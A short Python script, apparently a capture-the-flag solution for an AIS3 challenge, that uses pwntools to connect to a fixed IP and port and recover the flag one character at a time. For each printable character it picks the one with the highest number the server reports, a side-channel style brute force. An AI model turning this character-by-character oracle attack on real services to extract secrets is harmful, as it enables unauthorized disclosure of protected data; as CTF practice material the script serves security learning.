from pwn import *

context.log_level = 'error'

flag = 'AIS3{A1r1ght_U_4r3_my_3n3nnies'


def fn(c):
  r = remote('60.250.197.227', 11001, timeout=1)
  r.recv()
  r.sendline(flag+chr(c))
  t = int(r.recv().split(' ')[4])
  r.close()
  return t

for i in range (0, 40):
  sel_c = ''
  sel_t = 0
  tmp_t = 0
  jmp = 0
  for c in range(32, 127):
    if(jmp):
      break
    t = fn(c)
    tmp_t = t
    print chr(c) + " (" + str(t) + ")"
    if t > sel_t:
      sel_t = t
      sel_c = c
  flag = flag + chr(sel_c)
  print flag + " (" + str(sel_t) + ")" + "  tmp_t: " + str(tmp_t)

